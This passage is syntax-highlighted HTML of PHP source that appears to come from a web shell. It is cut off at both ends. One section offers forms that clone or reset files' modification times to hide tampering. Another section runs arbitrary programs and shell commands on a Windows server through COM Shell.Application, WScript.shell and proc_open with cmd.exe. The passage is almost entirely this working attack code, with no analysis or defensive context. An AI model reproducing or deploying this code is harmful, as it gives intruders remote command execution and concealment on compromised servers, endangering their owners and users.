#66cccc;\">'newtime'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">opfilemtime<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">filemtime(<\/span>$<span style=\"color: #ffcc66;\">opfile<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">$time = strtotime(\"$year-$month-$day $hour:$minute:$second\");<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">cachemonth<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'January'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>,<span style=\"color: #66cccc;\">'February'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>,<span style=\"color: #66cccc;\">'March'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">3<\/span>,<span style=\"color: #66cccc;\">'April'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">4<\/span>,<span style=\"color: #66cccc;\">'May'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">5<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'June'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">6<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'July'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">7<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'August'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">8<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'September'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">9<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'October'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">10<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'November'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">11<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'December'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">12<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Clone folder\/file was last modified time'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'file'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dir'<\/span>,$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Alter folder\/file'<\/span>,<span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'curfile'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">opf<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ile<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'size'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">120<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'newline'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Reference folder\/file (fullpath)'<\/span>,<span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'tarfile<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'size'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">120<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'newline'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfooter(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Set last modified'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'file'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dir'<\/span>,$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Current folder\/file (fullpath)'<\/span>,<span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'curfile'<\/span>,<span style=\"color: #66cccc; text-decoration: underline;\">'value'<\/span><span style=\"text-decoration: underline;\">=&gt;$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">opfile<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'size'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">120<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'newline'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;year:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'year'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">date(<\/span><span style=\"color: #66cccc;\">'Y'<\/span>,$<span style=\"color: #ffcc66;\">opfilemtime<\/span>),<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">4<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'month:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'month'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">date(<\/span><span style=\"color: #66cccc;\">'m'<\/span>,$<span style=\"color: #ffcc66;\">opfilemtime<\/span>),<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'day:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'day'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">date(<\/span><span style=\"color: #66cccc;\">'d'<\/span>,$<span style=\"color: #ffcc66;\">opfilemtime<\/span>),<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'hour:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'hour'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">date(<\/span><span style=\"color: #66cccc;\">'H'<\/span>,$<span style=\"color: #ffcc66;\">opfilemtime<\/span>),<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'minute:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'minute'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">date(<\/span><span style=\"color: #66cccc;\">'i'<\/span>,$<span style=\"color: #ffcc66;\">opfilemtime<\/span>),<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>))<span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'second:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'second'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">date(<\/span><span style=\"color: #66cccc;\">'s'<\/span>,$<span style=\"color: #ffcc66;\">opfilemtime<\/span>),<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>))<span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfooter(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">goback(<\/span>);\n}<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">end newtime<\/span>\n\n<span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'shell'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">IS_WIN<\/span> &amp;&amp; <span style=\"color: #f2777a; font-weight: bold;\">IS_COM<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">program<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">parameter<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">shell<\/span>= <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">COM<\/span>(<span style=\"color: #66cccc;\">'Shell.Application'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">a<\/span> = $<span style=\"color: #ffcc66;\">shell<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">ShellExecute<\/span>($<span style=\"color: #ffcc66;\">program<\/span>,$<span style=\"color: #ffcc66;\">parameter<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Program run has '<\/span>.(!$<span style=\"color: #ffcc66;\">a<\/span> ? <span style=\"color: #66cccc;\">'success'<\/span> : <span style=\"color: #66cccc;\">'fail'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">program<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">program<\/span> = <span style=\"color: #66cccc;\">'c:\\windows\\system32\\cmd.exe'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">parameter<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">parameter<\/span> = <span style=\"color: #66cccc;\">'\/c net start &gt; '<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">SA_ROOT<\/span>.<span style=\"color: #66cccc;\">'log.txt'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Execute Program'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'shell'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Program'<\/span>,<span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'program'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">program<\/span>,<span style=\"color: #66cccc;\">'<\/span><span style=\"color: #66cccc; text-decoration: underline;\">newline'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Parameter'<\/span>,<span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'parameter'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">param<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">eter<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'submit'<\/span>,<span style=\"color: #66cccc;\">'class'<\/span>=&gt;<span style=\"color: #66cccc;\">'bt'<\/span>,<span style=\"color: #66cccc;\">'type'<\/span>=&gt;<span style=\"color: #66cccc;\">'submit'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=<span style=\"text-decoration: underline;\">&gt;<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Execute'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Execute Command'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'shell'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">IS_WIN<\/span> &amp;&amp; <span style=\"color: #f2777a; font-weight: bold;\">IS_COM<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">execfuncdb<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'phpfunc'<\/span>=&gt;<span style=\"color: #66cccc;\">'phpfunc'<\/span>,<span style=\"color: #66cccc;\">'wscript'<\/span>=&gt;<span style=\"color: #66cccc;\">'wscript'<\/span>,<span style=\"color: #66cccc;\">'proc_open<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'proc_open'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeselect(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Use:'<\/span>,<span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'execfunc'<\/span>,<span style=\"color: #66cccc;\">'option'<\/span>=&gt;$<span style=\"color: #ffcc66;\">execfuncd<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">b<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'selected'<\/span><span style=\"text-decoration: underline;\">=&gt;$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">execfunc<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'newline'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Command'<\/span>,<span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'command'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">htmlspecialcha<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">rs(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">command<\/span><span style=\"text-decoration: underline;\">)));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'submit'<\/span>,<span style=\"color: #66cccc;\">'class'<\/span>=&gt;<span style=\"color: #66cccc;\">'bt'<\/span>,<span style=\"color: #66cccc;\">'type'<\/span>=&gt;<span style=\"color: #66cccc;\">'submit'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;<span style=\"color: #66cccc;\">'Ex<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ecute'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">command<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;hr width=\"100%\" noshade \/&gt;&lt;pre&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">execfunc<\/span>==<span style=\"color: #66cccc;\">'wscript'<\/span> &amp;&amp; <span style=\"color: #f2777a; font-weight: bold;\">IS_WIN<\/span> &amp;&amp; <span style=\"color: #f2777a; font-weight: bold;\">IS_COM<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">wsh<\/span> = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">COM<\/span>(<span style=\"color: #66cccc;\">'WScript.shell'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">exec<\/span> = $<span style=\"color: #ffcc66;\">wsh<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">exec<\/span>(<span style=\"color: #66cccc;\">'cmd.exe \/c '<\/span>.$<span style=\"color: #ffcc66;\">command<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">stdout<\/span> = $<span style=\"color: #ffcc66;\">exec<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">StdOut<\/span>();\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">stroutput<\/span> = $<span style=\"color: #ffcc66;\">stdout<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">ReadAll<\/span>();\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> $<span style=\"color: #ffcc66;\">stroutput<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">execfunc<\/span>==<span style=\"color: #66cccc;\">'proc_open'<\/span> &amp;&amp; <span style=\"color: #f2777a; font-weight: bold;\">IS_WIN<\/span> &amp;&amp; <span style=\"color: #f2777a; font-weight: bold;\">IS_COM<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">descriptorspec<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>  <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'pipe'<\/span>, <span style=\"color: #66cccc;\">'r'<\/span>),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>  <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'pipe'<\/span>, <span style=\"color: #66cccc;\">'w'<\/span>),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>  <span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'pipe'<\/span>, <span style=\"color: #66cccc;\">'w'<\/span>)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   );\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">process<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">proc_open(<\/span>$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'COMSPEC'<\/span>], $<span style=\"color: #ffcc66;\">descriptorspec<\/span>, $<span style=\"color: #ffcc66;\">pipes<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_resource(<\/span>$<span style=\"color: #ffcc66;\">process<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">fwrite(<\/span>$<span style=\"color: #ffcc66;\">pipes<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>], $<span style=\"color: #ffcc66;\">command<\/span>.<span style=\"color: #66cccc;\">\"\\r\\n\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">fwrite(<\/span>$<span style=\"color: #ffcc66;\">pipes<\/span>[<span style=\"color: 